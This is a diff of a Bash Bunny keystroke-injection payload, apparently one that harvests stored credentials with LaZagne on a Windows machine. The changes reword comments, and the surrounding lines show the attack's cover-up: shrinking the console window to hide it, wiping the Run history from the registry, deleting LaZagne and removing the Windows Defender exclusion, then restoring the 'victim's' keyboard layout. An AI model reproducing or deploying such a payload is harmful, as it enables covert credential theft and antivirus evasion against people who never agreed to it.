@@ -18,8 +18,8 @@ GET TARGET_HOSTNAME
 # Attack
 LED ATTACK
 
-# Change the keyboard layout to en-US with Altcode. I tried it with DUCKY_LANG but in my case, the "ch" language can't print all symbols, so it doesn't work
-# Delete this if you already have an en-US keyboard layout
+# This is changing the keyboard layout to en-US with altcode. DUCKY_LANG isn't working in some of the custom languages. This should work for every language.
+# Delete this if you already have an en-US keyboard layout.
 Q GUI r
 Q ALTCODE 45
 Q ALTCODE 45
@@ -56,7 +56,7 @@ Q LEFT
 Q ENTER
 sleep 1
 
-# Make the windows as small as possible
+# Make the window as small as possible
 Q STRING "[console]::windowwidth=1; [console]::windowheight=1;"
 Q ENTER
 
@@ -94,7 +94,7 @@ Q ENTER
 Q STRING "reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f"
 Q ENTER
 
-# Removes laZagne. You need to do this before you can remove the exclusion.
+# Removes laZagne. This is important before we can remove the exclusion for the Bunny.
 Q STRING "Remove-Item \"\$BLABEL\lazagne\" -recurse"
 Q ENTER
 
@@ -103,8 +103,7 @@ Q STRING "Remove-MpPreference -ExclusionPath \"\$BLABEL\""
 Q ENTER
 
 # Sets the keyboard layout back to normal
-# Replace de "de-CH" with the layout your victim uses. In my case, it is "de-CH" because I live in swiss.
-# It is important to change that because you probably don't live in switzerland.
+# Replace the "de-CH" with the layout your victim uses. In my case, it is "de-CH" because I live in swiss.
 Q STRING "Set-WinUserLanguageList -LanguageList de-CH -force;"
 Q ENTER
 
